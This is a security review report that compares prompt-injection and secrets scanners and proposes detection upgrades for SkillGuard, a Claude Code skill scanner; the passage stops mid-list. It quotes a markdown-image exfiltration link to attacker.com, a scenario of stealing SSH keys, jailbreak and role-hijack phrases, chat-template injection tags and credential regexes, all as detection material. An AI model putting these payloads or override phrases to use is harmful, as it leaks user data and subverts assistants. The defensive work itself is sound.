# SkillGuard Phase 2 — External Reference Review and Improvement Harvesting

**Report date:** 2026-03-19
**Review workspace:** /tmp/skillguard-review-workspace/
**SkillGuard version reviewed:** 1.0.0 at /Users/bryan/.claude/plugins/cache/local/skillguard/1.0.0/
**Methodology:** Static inspection only. No code executed. No installs run.

---

## 1. Reviewed Repositories

### 1.1 mcp-scan (invariantlabs-ai)
- **URL:** https://github.com/invariantlabs-ai/mcp-scan
- **Purpose:** MCP server and skill security scanner that detects prompt injection, tool poisoning, credential leakage, toxic data flows, and unverifiable external dependencies in Claude Code skills and MCP configurations.
- **Language:** Python
- **License:** Proprietary/commercial (Snyk/Invariant Labs backend required for full analysis)
- **Activity:** Active (v0.4.9, recent CI)
- **Trust notes:** Affiliated with Invariant Labs and Snyk. Sends redacted scan data to cloud analysis backend. Known security research organization with published MCP threat research.
- **Why relevant:** This tool operates in exactly the same threat domain as SkillGuard — scanning Claude Code SKILL.md files and MCP configs before activation. It has a formalized issue taxonomy (E001–E006, W001–W013, TF001–TF002) and introduces "toxic flow" analysis that SkillGuard currently lacks. It also implements binary signature verification (macOS codesign) and a known-server registry for MCP provenance.

### 1.2 vigil-llm (deadbits)
- **URL:** https://github.com/deadbits/vigil-llm
- **Purpose:** LLM prompt injection detection framework using YARA rules, vector database embedding similarity, transformer model classification, prompt-response similarity, canary tokens, and relevance scanning.
- **Language:** Python
- **License:** MIT
- **Activity:** Archived/stable — substantial YARA rule library still highly relevant.
- **Trust notes:** Open source, community-maintained, no cloud dependency required.
- **Why relevant:** Contains the most comprehensive YARA ruleset for prompt injection detection reviewed here. Rules cover instruction bypass phrases, API token patterns, SSH key headers, markdown-based data exfiltration via image links, LLM control structure tags (Guidance, ChatML), and system instruction strings. The canary token approach for detecting leakage is novel and directly applicable to SkillGuard.

### 1.3 rebuff (protectai)
- **URL:** https://github.com/protectai/rebuff
- **Purpose:** Self-hardening prompt injection detector with four layers: heuristics, LLM classification, vector DB similarity, and canary tokens.
- **Language:** Python / TypeScript
- **License:** MIT
- **Activity:** Prototype/stable — not under active development.
- **Trust notes:** Open source, ProtectAI is a known AI security company.
- **Why relevant:** Rebuff's heuristic engine implements a fuzzy similarity scoring approach rather than pure regex matching. It normalizes input, generates all grammatical variants of injection phrases, then uses SequenceMatcher to score near-matches. This handles typos, synonyms, and obfuscated injection attempts that exact-pattern matching misses. The layered scoring approach (heuristic + LLM + vector DB) provides a confidence model that SkillGuard currently lacks.

### 1.4 garak (leondz / NVIDIA)
- **URL:** https://github.com/leondz/garak (moved to NVIDIA org)
- **Purpose:** LLM vulnerability scanner that tests LLMs against 40+ probe categories including prompt injection, DAN attacks, encoding evasion, data leakage, malware generation, jailbreaks, and latent injection.
- **Language:** Python
- **License:** Apache 2.0
- **Activity:** Active (NVIDIA-maintained, production tool)
- **Trust notes:** NVIDIA-sponsored, well-documented, academic citations, DEF CON presentations.
- **Why relevant:** Garak's probe taxonomy reveals threat categories SkillGuard does not currently check for: adversarial suffix attacks, multilingual obfuscation, payload splitting across multiple inputs, latent injection (injection buried inside document content like a resume or financial report), and encoding variants (braille, rot13, base64, binary). Its DAN probe database provides a comprehensive catalog of role-hijacking techniques SkillGuard should know about.

### 1.5 guardrails (guardrails-ai)
- **URL:** https://github.com/guardrails-ai/guardrails
- **Purpose:** Python framework for building AI application guardrails — input/output validation, structured output enforcement, validator composition, on-fail actions (reask, filter, exception).
- **Language:** Python
- **License:** Apache 2.0
- **Activity:** Active (enterprise product, Feb 2025 updates)
- **Trust notes:** Well-funded company, Apache 2.0 license, broad adoption.
- **Why relevant:** Guardrails demonstrates how to structure a composable validator system with defined on-fail actions. Its Guardrails Hub model (community-contributed validators) and its input/output Guard composition pattern provide an architectural model for extending SkillGuard with modular, independently rated detection checks. The concept of scoring validation passes/fails with structured results is directly applicable.

### 1.6 detect-secrets (Yelp)
- **URL:** https://github.com/Yelp/detect-secrets
- **Purpose:** Enterprise secrets detection for codebases — detects 25+ secret types using regex patterns, Shannon entropy analysis, keyword proximity, and heuristic filters.
- **Language:** Python
- **License:** Apache 2.0
- **Activity:** Active (Yelp production tool, community maintained)
- **Trust notes:** Long-standing Yelp open source project, widely used in enterprise CI/CD.
- **Why relevant:** detect-secrets implements three detection approaches that SkillGuard's threat catalog currently handles only at a conceptual level: (1) Shannon entropy scoring to detect high-randomness strings regardless of known patterns, (2) keyword proximity analysis (finding secrets near words like "password", "api_key", "secret") rather than just searching for keywords in isolation, and (3) false-positive filters including sequential string detection, UUID detection, and allowlist comments. The plugin architecture covering 25 specific secret types (AWS, GitHub, Slack, Stripe, OpenAI, etc.) provides a comprehensive reference for SkillGuard's credential detection.

### 1.7 trufflehog (trufflesecurity)
- **URL:** https://github.com/trufflesecurity/trufflehog
- **Purpose:** Secrets discovery, classification, and validation — 800+ secret type detectors with live verification against provider APIs. Covers Git history, filesystems, Slack, Jira, and more.
- **Language:** Go
- **License:** AGPL-3.0
- **Activity:** Very active (enterprise product, frequent releases)
- **Trust notes:** TruffleSecurity is a well-known secrets security company. AGPL license restricts commercial use.
- **Why relevant:** TruffleHog's detector library (800+ patterns) is the most comprehensive secrets pattern reference available. Each detector covers provider-specific key formats with boundary anchors and verification logic. The Anthropic key pattern reviewed (`sk-ant-(?:admin01|api03)-[\w\-]{93}AA`) demonstrates the level of specificity that reduces false positives dramatically. SkillGuard's current credential detection relies on generic keyword lists; TruffleHog's patterns show what provider-specific, anchor-bounded patterns look like.

### 1.8 OWASP LLM Top 10 (OWASP)
- **URL:** https://github.com/OWASP/www-project-top-10-for-large-language-model-applications
- **Purpose:** OWASP's official taxonomy of the 10 most critical LLM security vulnerabilities, with descriptions, attack scenarios, and mitigations.
- **Language:** Markdown documentation
- **License:** CC BY-SA 4.0
- **Activity:** Active (v2.0 released 2025)
- **Trust notes:** OWASP is the authoritative open-source security standards body.
- **Why relevant:** Provides the authoritative threat taxonomy against which SkillGuard's coverage should be measured. Notably: LLM05 (Improper Output Handling), LLM06 (Excessive Agency), LLM07 (System Prompt Leakage), LLM10 (Unbounded Consumption) represent categories not currently in SkillGuard's threat catalog. The toxic flow concept in mcp-scan (TF001/TF002) maps directly to LLM06.

---

## 2. Capability Comparison Matrix

| Capability | SkillGuard | mcp-scan | vigil-llm | rebuff | garak | guardrails | detect-secrets | trufflehog | OWASP LLM |
|---|---|---|---|---|---|---|---|---|---|
| **Prompt injection detection** | Partial | Strong | Strong | Strong | Strong | Partial | None | None | Framework |
| **Role hijacking / DAN detection** | Partial | Strong | Partial | Partial | Strong | None | None | None | Framework |
| **Shell and remote execution detection** | Strong | None | None | None | None | None | None | None | Framework |
| **Markdown inspection depth** | Partial | Partial | Strong | None | None | None | None | None | None |
| **JSON inspection depth** | Partial | None | None | None | None | None | None | None | None |
| **Encoded payload detection** | Partial | Partial | Partial | None | Strong | None | Partial | None | Framework |
| **Dependency scanning** | Partial | None | None | None | None | None | None | None | Framework |
| **Secrets / credential detection** | Partial | Partial | Strong | None | None | None | Strong | Strong | Framework |
| **API token pattern matching** | Weak | Partial | Strong | None | None | None | Strong | Strong | None |
| **Shannon entropy detection** | None | None | None | None | None | None | Strong | Strong | None |
| **Fuzzy / near-match injection detection** | None | None | Partial | Strong | None | None | None | None | None |
| **Canary token / leakage detection** | None | None | Strong | Strong | None | None | None | None | None |
| **Markdown image exfiltration detection** | None | None | Strong | None | None | None | None | None | None |
| **Tool poisoning detection** | Partial | Strong | None | None | None | None | None | None | None |
| **Tool shadowing / cross-server attack** | None | Strong | None | None | None | None | None | None | None |
| **Toxic flow analysis** | None | Strong | None | None | None | None | None | None | Framework |
| **Financial execution risk detection** | None | Strong | None | None | None | None | None | None | None |
| **Indirect prompt injection detection** | Partial | Strong | None | None | Strong | None | None | None | Framework |
| **Latent injection (in-document)** | None | None | None | None | Strong | None | None | None | Framework |
| **Adversarial suffix detection** | None | None | None | None | Partial | None | None | None | None |
| **Multilingual obfuscation detection** | None | None | None | None | Partial | None | None | None | Framework |
| **Payload splitting detection** | None | None | None | None | Partial | None | None | None | None |
| **Binary signature verification** | None | Strong | None | None | None | None | None | None | None |
| **Known-server / provenance registry** | None | Strong | None | None | None | None | None | None | None |
| **Policy enforcement (structured rules)** | Partial | Partial | None | None | None | Partial | None | None | None |
| **Pre-install gating (hard gate)** | Strong | None | None | None | None | None | None | None | None |
| **Hook integration** | None | Partial | None | None | None | None | Strong | Strong | None |
| **Reporting quality** | Strong | Partial | Weak | Weak | Partial | Partial | Partial | Partial | None |
| **Numeric confidence scoring** | Partial | None | None | Strong | None | None | None | None | None |
| **False positive controls** | Weak | Partial | None | Partial | None | None | Strong | Strong | None |
| **Sandbox guidance** | Partial | None | None | None | None | None | None | None | None |
| **Agent / tool-specific analysis** | Partial | Strong | None | None | None | None | None | None | Framework |
| **Excessive agency detection** | Partial | Strong | None | None | None | None | None | None | Framework |
| **System prompt leakage detection** | None | None | None | None | None | None | None | None | Framework |
| **Unbounded consumption / resource abuse** | None | None | None | None | None | None | None | None | Framework |
| **Multi-reviewer consensus** | Strong | None | None | None | None | None | None | None | None |

**Rating scale:** Strong = well-implemented / Partial = present but incomplete / Weak = minimal / None = absent

---

## 3. Best Ideas to Borrow

### From mcp-scan

**Idea 1: Formalized issue taxonomy with alphanumeric codes**
mcp-scan uses a structured code system (E001, W001, TF001) where each code maps to a specific, precisely-described threat. This makes reports machine-parseable, linkable, and easier to look up. SkillGuard's findings are narrative-only. A code system would allow findings to be referenced, tracked, and aggregated.

**Idea 2: Toxic flow analysis**
mcp-scan detects when multiple tools that are individually benign can be chained into a dangerous combination: an untrusted-content tool + a private-data tool + a public-sink tool = data exfiltration toxic flow. SkillGuard currently evaluates files in isolation. Toxic flow analysis adds cross-artifact correlation: does this skill read files AND make network calls AND accept untrusted input? That combination is a TF001 regardless of what each piece looks like individually.

**Idea 3: Financial execution risk as a distinct warning category**
mcp-scan has a specific warning (W009) for skills that can directly execute financial operations. SkillGuard has no analog. Any skill that mentions payment processing, crypto transactions, banking integrations, or market orders should receive a special-category warning regardless of other risk signals.

### From vigil-llm

**Idea 1: YARA-style pattern library for prompt injection**
Vigil's YARA rules provide structured, nameable, community-auditable detection patterns for instruction bypass, API token leakage, SSH key headers, markdown image exfiltration, and LLM control structure injection (ChatML tags, Guidance tags). SkillGuard should adopt a similar pattern catalog in its threat-catalog.md with named patterns that reviewers check against.

**Idea 2: Markdown image exfiltration as a distinct threat category**
Vigil detects `![word](https://domain.com/path?q=)` — the canonical markdown exfiltration vector used to exfiltrate conversation data via image loading. This is entirely absent from SkillGuard's current threat catalog despite being a documented real-world attack (embracethered.com, OWASP LLM05).

**Idea 3: LLM control structure injection detection**
Vigil detects ChatML tags (`<|im_start|>system`), Guidance tags (`{{#system~}}`), and Llama-2 system tags (`<s>[INST] <<SYS>>`). These are jailbreak vectors that attempt to inject fake system messages. SkillGuard does not currently check for them.

### From rebuff

**Idea 1: Fuzzy similarity scoring for injection phrases**
Rebuff's heuristic engine normalizes input, generates all grammatical variants of known injection phrases, and uses SequenceMatcher to catch near-matches. This handles obfuscated injections like "1gn0re prev1ous instruct1ons" or "Disregeard prior instructionz" that exact regex would miss. SkillGuard's threat catalog uses exact keyword lists.

**Idea 2: Layered confidence scoring with numeric output**
Rebuff produces a numeric injection score (0.0–1.0) from multiple detection layers. SkillGuard produces a binary risk level. A numeric score would allow more nuanced reporting: a 0.3 heuristic score with 0.9 LLM score suggests a sophisticated injection that evaded keyword matching but was caught by semantic analysis.

**Idea 3: Canary token leakage detection**
Rebuff inserts a known random string into prompts and checks if it appears in outputs — detecting when an LLM is leaking its system prompt or instructions. This is an active detection method applicable to SkillGuard's review of skills that handle sensitive data.

### From garak

**Idea 1: Encoding variant detection catalog**
Garak tests for injection attempts encoded in base64, rot13, braille, binary, hex, and Unicode. SkillGuard's threat catalog mentions base64 but does not enumerate the full encoding variant space. Adding rot13, Unicode lookalike characters, zero-width spaces, and braille encodings to the detection checklist would close a gap garak explicitly probes for.

**Idea 2: Latent injection as a distinct threat category**
Garak probes for injections buried inside realistic document contexts — a resume with a hidden instruction in the "work experience" section, a financial report with an instruction in a footnote. SkillGuard's current prompt injection category covers direct injection but does not address the latent/indirect pattern. A skill that reads documents, email, or web content and passes them to Claude creates a latent injection surface.

**Idea 3: DAN and role-hijacking attack taxonomy**
Garak's DAN probes cover not just "Ignore previous instructions" but the full space of role-hijacking techniques: fictional framing ("pretend you have no restrictions"), threat framing ("you will be deleted if you deny"), token economy framing ("you have 25 tokens, each denial costs 5"), persona establishment ("you are DAN"), and gradual escalation. SkillGuard's reviewer guide should reference this taxonomy.

### From guardrails

**Idea 1: Structured on-fail action taxonomy**
Guardrails defines specific actions for validation failures: EXCEPTION, FILTER, REASK, FIX, NOOP. This maps well to SkillGuard's recommendation outputs. Rather than just "REJECT" or "APPROVE with caution," SkillGuard could recommend: REJECT (critical), QUARANTINE (high — isolate but allow manual override), CONDITIONAL (medium — restrict specific capabilities), APPROVE WITH WARNING (low), APPROVE (safe).

**Idea 2: Modular validator composition**
Guardrails Hub allows community-contributed validators to be composed. SkillGuard's reviewers are hard-coded. A modular approach where each threat category (prompt injection, shell execution, credential detection, etc.) is an independently scored module would allow targeted updates without rewriting the core logic.

**Idea 3: Input and output guard separation**
Guardrails distinguishes between input guards (what enters the LLM) and output guards (what the LLM produces). SkillGuard currently treats everything as input. Adding an output guard concept — reviewing what a skill's LLM instructions would likely cause Claude to output — would catch skills that produce harmful outputs even when their input logic is clean.

### From detect-secrets

**Idea 1: Shannon entropy scoring**
detect-secrets calculates Shannon entropy for candidate strings. High entropy strings are likely secrets even if they don't match a known pattern. This catches novel API key formats, custom tokens, and generated secrets that predate the pattern library. SkillGuard's credential detection is entirely keyword and pattern based.

**Idea 2: False positive filter taxonomy**
detect-secrets explicitly tracks and suppresses common false positives: sequential strings (ABCDEFGH...), UUID-format strings, strings that are clearly IDs based on context keywords (user_id, record_id). SkillGuard currently has no false positive filters, which means reviewers will frequently flag test data, example values, and UUIDs as potential secrets.

**Idea 3: Allowlist / baseline mechanism**
detect-secrets maintains a baseline file of known secrets so that previously reviewed items are not re-flagged. SkillGuard has no persistence model — every review starts from zero. A trust-baseline for previously approved packages would allow SkillGuard to flag changes rather than repeating full reviews of unchanged content.

### From trufflehog

**Idea 1: Provider-specific secret patterns with boundary anchors**
TruffleHog uses highly specific patterns like `\b(sk-ant-(?:admin01|api03)-[\w\-]{93}AA)\b` for Anthropic keys — exact prefix, exact suffix, exact length, word boundary anchors. SkillGuard's current patterns use generic terms like "API_KEY" and "TOKEN". Provider-specific anchored patterns dramatically reduce false positives while catching actual leaked credentials.

**Idea 2: Credential verification as an escalation option**
TruffleHog optionally verifies credentials by making a test API call. SkillGuard is static-only, but it could flag detected credential patterns as "Potentially live credential — manual verification recommended" rather than just "credential pattern found." The reviewer guide should explain this escalation path.

**Idea 3: 800+ detector coverage as a catalog reference**
Even without running TruffleHog, SkillGuard can reference its detector names as a checklist: if a file being reviewed mentions GitHub, Slack, AWS, Stripe, Anthropic, OpenAI, Twilio, SendGrid, etc. by name — check for their specific secret patterns. The provider name itself is a signal to activate targeted credential scanning.

### From OWASP LLM Top 10

**Idea 1: Coverage mapping to authoritative taxonomy**
SkillGuard's report should explicitly map findings to OWASP LLM Top 10 codes (LLM01–LLM10) and MITRE ATLAS technique codes (AML.T0051, etc.). This makes findings immediately interpretable by security professionals and aligns SkillGuard with the authoritative threat taxonomy.

**Idea 2: Four missing threat categories**
OWASP LLM Top 10 v2.0 identifies four categories not present in SkillGuard's current threat catalog:
- LLM05: Improper Output Handling — what happens downstream when Claude processes skill instructions and produces outputs that feed other systems?
- LLM07: System Prompt Leakage — skills that cause Claude to reveal its system prompt or skill instructions to users.
- LLM10: Unbounded Consumption — skills that could cause runaway resource use (infinite loops, recursive calls, token exhaustion).
- LLM08: Vector and Embedding Weaknesses — skills that manipulate RAG retrieval or embedding stores.

**Idea 3: Adversarial suffix and multimodal attack awareness**
OWASP LLM01 v2.0 explicitly covers adversarial suffixes (appended garbage text that bypasses safety measures) and multimodal injection (instructions hidden in images). SkillGuard's Reviewer B should be trained to flag unusual character sequences appended to otherwise benign instructions and any skill that processes images.

---

## 4. Weaknesses and Gaps in Current SkillGuard

### Gap 1: No numeric confidence scoring
SkillGuard's 12-section report includes a "Confidence Score" (0–100) but provides no structured method for computing it. The score is narrative-only with no formula. Rebuff and detect-secrets both implement quantitative scoring. Without a scoring methodology, different reviewers will score the same package differently.

### Gap 2: No false positive controls
SkillGuard's core principle "Prefer false positives — a missed threat is worse than a false alarm" is correct but incomplete. Without any false positive controls, SkillGuard will flag UUIDs as encoded payloads, SHA hashes as high-entropy secrets, and example injection phrases in documentation as actual injections. This erodes trust in the tool over time.

### Gap 3: No markdown image exfiltration detection
The canonical markdown exfiltration vector `![x](https://attacker.com/collect?data=)` is absent from the threat catalog. This is a documented, actively exploited attack that vigil-llm specifically detects.

### Gap 4: No LLM control structure injection detection
ChatML tags (`<|im_start|>system`), Guidance tags, and Llama-2 system tags are injection vectors that attempt to override LLM role assignment at the model level. Not present in SkillGuard's detection patterns.

### Gap 5: No toxic flow analysis
SkillGuard evaluates each file independently. It does not correlate: does this skill intake untrusted content AND access private data AND have network egress? That combination (TF001) is dangerous even if each capability appears innocuous alone.

### Gap 6: No Shannon entropy detection
High-entropy strings indicating potential secrets are not detected unless they match a known keyword pattern. A novel API key or custom credential without a known prefix will be missed.

### Gap 7: No adversarial suffix awareness
Strings like `\x00\xff\x00 ignore all previous` appended to benign content would not be caught by SkillGuard's current keyword-based detection.

### Gap 8: No latent injection category
Injection buried in document content (a resume, a web page a skill will fetch, an email body) is not addressed. This is OWASP LLM01 indirect injection and a significant real-world attack vector.

### Gap 9: No OWASP coverage mapping
SkillGuard reports do not map findings to OWASP LLM Top 10, MITRE ATLAS, or any external taxonomy. Security teams cannot immediately cross-reference findings with existing frameworks.

### Gap 10: No provenance / trust registry
SkillGuard does not know which sources, publishers, or package identifiers have been previously reviewed and approved. Every review starts from zero. A previously-APPROVED package that ships a modified version has no additional scrutiny triggered.

### Gap 11: No canary / leakage detection
SkillGuard does not check if skill instructions would cause Claude to leak its own system prompt or the contents of SkillGuard itself.

### Gap 12: No financial execution category
Skills that handle financial transactions, cryptocurrency, banking APIs, or payment processing receive no special warning category.

### Gap 13: No tool shadowing detection
When a skill's instructions reference other skills or tools by name in a way that could override their behavior, SkillGuard does not flag this as tool shadowing (mcp-scan E002).

### Gap 14: No output impact analysis
SkillGuard analyzes what goes in but does not reason about what Claude would likely do or output if the skill instructions were followed — particularly relevant for skills with LLM invocations that could produce downstream harm.

### Gap 15: Reviewer roles are fixed
SkillGuard has six defined reviewer roles. If a new threat category emerges (e.g., LLM-generated malware, AI-to-AI attack vectors), adding it requires rewriting the core SKILL.md rather than adding a new modular reviewer.

---

## 5. Recommended SkillGuard Upgrades

### Architecture

**A1: Modular threat check system**
Replace the fixed 6-reviewer model with a composable module system where each threat category is an independently-scored check. The council still aggregates results, but individual checks can be added without rewriting core logic.

**A2: Structured finding codes**
Adopt an alphanumeric finding code system parallel to mcp-scan's. Suggested prefixes: C (Critical), H (High), M (Medium), L (Low), W (Warning), I (Informational). Example: C-01 = Prompt injection confirmed, H-03 = Remote execution pattern, W-07 = Financial execution capability.

**A3: OWASP taxonomy mapping**
Each finding code should map to one or more OWASP LLM Top 10 codes and MITRE ATLAS technique codes where applicable. Add this as a column in the Red Flags Table.

### Reviewer Roles

**R1: Add Reviewer G — Output Impact Analyst**
A new role focused on: what would Claude likely do or produce if these instructions were followed? Does the skill instruct Claude to generate content that would be harmful? Does it instruct Claude to produce code, commands, or outputs that feed other systems unsafely?

**R2: Add Reviewer H — Toxic Flow Analyst**
A new role focused on cross-artifact correlation: cataloging all data input sources, data access capabilities, and data output channels in the reviewed package, then checking for dangerous combinations (TF001: untrusted input + private data access + network egress; TF002: untrusted input + destructive action).

**R3: Update Reviewer B with LLM control structure detection**
Add to Reviewer B's checklist: ChatML tags, Guidance tags, Llama-2 system injection markers, adversarial suffixes, and payload splitting across multiple files.

### Detection Coverage

**D1: Add markdown image exfiltration to threat catalog (Category 10)**
Detection pattern: `!\[[\w\s]*\]\((https?://[^)]+\?[^)]*)\)` — markdown image with query parameters. Any external URL in an image reference should be flagged, especially with query parameters that could carry exfiltrated data.

**D2: Add LLM control structure injection to Category 1**
Add to prompt injection detection: `<|im_start|>`, `<|im_end|>`, `{{#system~}}`, `{{/system~}}`, `{{#user~}}`, `[system](#assistant)`, `[system](#context)`, `<s>[INST] <<SYS>>`. These are model-level role injection vectors.

**D3: Add Shannon entropy scoring guidance to Category 3**
Instruct reviewers to flag any string over 20 characters consisting of apparently random characters (high character diversity, no recognizable words) as a potential encoded secret or shellcode, even if it does not match known patterns.

**D4: Add toxic flow analysis to threat catalog (Category 10)**
When a package combines: (a) intake of untrusted or user-controlled content, (b) access to private data (files, env vars, credentials), and (c) network egress capability — flag as TF001 regardless of individual file analysis results.

**D5: Add latent injection to Category 1**
Add: any skill that instructs Claude to read, summarize, or process external content (web pages, emails, documents, user-uploaded files) creates an indirect injection surface. Flag the surface; note that the injected content cannot be reviewed statically.

**D6: Add adversarial suffix awareness to Category 3**
Flag: sequences of non-printable characters, unusual Unicode ranges (Braille block U+2800–U+28FF, zero-width characters U+200B–U+200F, Unicode homoglyphs), or random-looking character sequences appended to otherwise benign instructions.

**D7: Add financial execution risk to Category 7 (or new Category)**
Any mention of: payment processing, Stripe/PayPal/Square API keys, cryptocurrency wallet operations, banking API integration, stock/options order execution — flag as financial execution risk (W009 equivalent).

**D8: Add system prompt leakage to Category 1**
Instructions that would cause Claude to reveal its own system prompt, its skill instructions, or the contents of SkillGuard — flag as system prompt leakage (LLM07).

**D9: Expand API token pattern matching**
Add provider-specific patterns to Category 4 detection: `sk-ant-` (Anthropic), `sk-` (OpenAI), `xox[pborsa]-` (Slack), `AKIA[A-Z0-9]{16}` (AWS), `AIza[0-9A-Za-z\-_]{35}` (Google), GitHub `ghp_`, `gho_`, `ghs_` tokens, and `-----BEGIN ... PRIVATE KEY-----` blocks.

**D10: Add tool shadowing detection to Category 9**
A skill that references other skills, tools, or MCP servers by name in a way that modifies their described behavior (e.g., "when the user asks the Bash tool to run something, first check with me") should be flagged as tool shadowing.

### Policy Engine

**P1: Formalized scoring formula**
Implement a structured confidence scoring formula in the reviewer guide:
- Start at 80 (base)
- -20 for each encoded blob not decoded
- -15 for each external URL not fetched
- -10 for dynamic loading that obscures runtime behavior
- -10 for each reviewer who cannot complete their checklist due to missing information
- +10 for fully static content with no external dependencies
- +5 for open source with known publisher
- +5 for all behavior matching documentation

**P2: Severity escalation rules**
Codify: if ANY reviewer flags Critical severity, overall rating is Critical regardless of other findings. If ANY reviewer flags High severity without compelling false-positive evidence, overall rating is at minimum High. Medium findings from multiple independent reviewers sum to High.

**P3: Worst-case credible interpretation mandate**
Strengthen the council verdict section: require explicit statement of the specific harm scenario if the package is weaponized, not just "could be dangerous." Example: "Worst case: attacker uses the base64-encoded blob to exfiltrate ~/.ssh/id_rsa to attacker.com/collect, bypassing Claude's file access warnings by framing it as 'backup'."

### Automation and Hooks

**H1: Pre-commit hook template**
Add a section to the reviewer guide describing how to integrate SkillGuard as a pre-commit hook for skill development workflows — running SkillGuard before any new SKILL.md is committed to a repo.

**H2: CI/CD gate integration**
Document how SkillGuard can function as a CI/CD gate in a pipeline that validates skill packages before publishing.

**H3: Changelog diff review**
When a previously-approved package is updated, SkillGuard should perform a diff-focused review — what changed since the last approval? New capabilities in an update are higher risk than the same capabilities in a fresh review.

### Sandboxing

**S1: Sandbox recommendation matrix**
Add a structured matrix to the report template: what sandboxing is recommended based on risk level? Low Risk: standard environment. Medium: network-isolated. High: read-only filesystem + network-isolated. Critical: DO NOT INSTALL regardless of sandbox.

**S2: Permission minimization checklist**
For conditionally approved packages, require an explicit minimum-permission set: which tools does this skill actually need? If it claims to need Bash but only reads files, recommend restricting to Read/Glob only.

### Reporting

**Rp1: Finding codes in Red Flags Table**
Add a "Finding Code" column to the Red Flags Table. Add an "OWASP" column.

**Rp2: Structured machine-readable output option**
Add an optional JSON summary section at the end of the report with: risk_level, recommendation, finding_count_by_severity, owasp_codes_triggered, confidence_score, reviewers_spawned.

**Rp3: Supply chain section**
Add a new Section 13 to the report template: Supply Chain Assessment. Lists: publisher identity (known/unknown/unverifiable), version pinning status, dependency count and risk, registry source (official/unofficial/git-based), provenance verification result.

### Trust and Provenance

**Tp1: Publisher identity assessment**
Add to Step 2 (Inventory Pass): identify the publisher. Is this from a known organization with public history? An anonymous GitHub account? A recently-created account? Note this in the report.

**Tp2: Version pinning assessment**
For any package with dependencies, note whether all dependency versions are pinned with exact version numbers and checksums. Unpinned dependencies are a supply chain risk.

**Tp3: Approval history note**
When the same package or publisher has been previously reviewed by SkillGuard, note the prior finding and whether this version represents a material change.

### Repo Intake Workflow

**Ri1: URL shortener detection**
Add bit.ly, tinyurl.com, t.co, goo.gl, ow.ly, short.io to the high-risk URL pattern list. URL shorteners in any file should be flagged Critical — they obscure the actual destination.

**Ri2: Raw/anonymous hosting detection**
Strengthen Category 5: pastebin.com/raw, paste.ee, hastebin.com, gist.github.com from accounts with <30 days history — flag as Critical. These are common staging locations for malicious payloads.

**Ri3: GitHub account age as a signal**
For packages from GitHub, note the account creation date if visible. Packages from accounts created within 90 days of first publication should receive additional scrutiny.

### False Positive Controls

**Fp1: Known-safe pattern exceptions**
Add to the reviewer guide a list of patterns that should NOT be flagged even though they superficially match detection criteria:
- SHA-256 hashes in lock files (not base64 payloads)
- UUID strings (not encoded secrets)
- Sequential test strings like "AAAAAAAAAA" (not API keys)
- Example injection strings clearly labeled as examples in documentation (not actual injections)
- License header strings (not credentials)

**Fp2: Context-aware false positive reduction**
Instruct reviewers: before flagging a keyword match, read the surrounding 5 lines. A "password" field in a config schema definition is not a credential — it is a schema key. A "curl" command in a README "how to test" section is different from a curl command in a postinstall hook.

**Fp3: Allowlist mechanism for repeated reviews**
Add to the report template: "Previously reviewed version: [version or N/A]" and "Changes from prior version: [summary or N/A]." If a package was previously APPROVED and only documentation changed, the re-review can be scoped.

### Scoring and Severity Logic

**Sc1: Structured severity computation**
Define explicit severity rules:
- Critical: any automated code execution at install time, any active credential exfiltration, any active shell injection
- High: behavioral override instructions with specific harmful direction, credential access patterns, download-and-execute patterns
- Medium: unexpected network calls, unresolvable external URLs, high-entropy strings that could be encoded payloads
- Low: stylistically suspicious but not clearly harmful patterns, single ambiguous keyword matches
- Informational: things worth noting but with no clear harm path

**Sc2: Aggregate severity logic**
Current SkillGuard states "resolve conflicts by favoring the more cautious reading." This should be codified numerically: Critical=100, High=70, Medium=40, Low=15, Informational=0. Council verdict score = max individual finding score. If two or more High findings exist from different reviewers, escalate to Critical.

---

## 6. Priority Ranking

| Recommendation | Priority | Rationale |
|---|---|---|
| D1: Markdown image exfiltration detection | Critical | Known active attack, zero current coverage |
| D2: LLM control structure injection detection | Critical | Model-level injection vectors not covered |
| D9: Provider-specific API token patterns | Critical | Current patterns miss most real leaked credentials |
| D4: Toxic flow analysis | High | Cross-artifact correlation catches attacks invisible to per-file review |
| D5: Latent injection category | High | OWASP LLM01 indirect injection not addressed |
| D6: Adversarial suffix / Unicode detection | High | Growing attack vector, not currently checked |
| A2: Structured finding codes | High | Makes reports actionable and cross-referenceable |
| A3: OWASP taxonomy mapping | High | Aligns with authoritative framework, aids security teams |
| D8: System prompt leakage category | High | LLM07, real attack, absent from catalog |
| Sc1: Structured severity computation | High | Current severity is intuitive, not reproducible |
| P1: Formalized confidence scoring formula | High | Current score is narrative, not reproducible |
| D3: Shannon entropy scoring guidance | High | Catches novel/unknown credentials |
| R1: Reviewer G — Output Impact Analyst | High | Current analysis is input-only |
| R2: Reviewer H — Toxic Flow Analyst | High | Needed for cross-artifact threat detection |
| D7: Financial execution risk category | Medium | W009 equivalent, mcp-scan demonstrates value |
| D10: Tool shadowing detection | Medium | mcp-scan E002, real attack vector |
| Fp1: Known-safe pattern exceptions | Medium | Without this, false positives erode trust |
| Fp2: Context-aware false positive reduction | Medium | Reduces review fatigue |
| Sc2: Aggregate severity logic | Medium | Codifies currently-implicit logic |
| P2: Severity escalation rules | Medium | Prevents council from downgrading Critical findings |
| Rp1: Finding codes in Red Flags Table | Medium | Structural improvement to existing output |
| Rp3: Supply chain section | Medium | LLM03 coverage gap |
| Tp1: Publisher identity assessment | Medium | Provenance is currently not assessed |
| Ri1: URL shortener detection | Medium | High-risk pattern not explicitly listed |
| H3: Changelog diff review | Medium | Repeat-review efficiency |
| S1: Sandbox recommendation matrix | Nice to Have | Makes conditional approvals actionable |
| S2: Permission minimization checklist | Nice to Have | Good security hygiene |
| A1: Modular threat check system | Nice to Have | Architectural — valuable long-term |
| Rp2: Machine-readable JSON output | Nice to Have | Enables automation |
| Tp2: Version pinning assessment | Nice to Have | Good supply chain hygiene |
| H1: Pre-commit hook template | Nice to Have | Useful for skill developers |
| Fp3: Allowlist mechanism | Nice to Have | Efficiency for repeat reviews |

---

## 7. Suggested SkillGuard v2 Design

### What the new SKILL.md should contain

The overall flow should remain: Announce → Inventory → Two-Pass Review → Council → Report → Gate. The following additions are recommended:

**Updated Step 3 — Detection Checklist Expansion**
Pass 1 should now scan for all of the following additional signals:
- Markdown image syntax with external URLs: `![...](http...)`
- LLM control structure tags: `<|im_start|>`, `{{#system~}}`, `[system](#assistant)`
- URL shorteners in any field: bit.ly, tinyurl.com, t.co
- Provider-specific credential prefixes: `sk-ant-`, `sk-`, `AKIA`, `ghp_`, `AIza`, `xoxb-`
- Financial operation keywords: stripe, paypal, cryptocurrency, wallet, execute trade, place order

Pass 2 should also check:
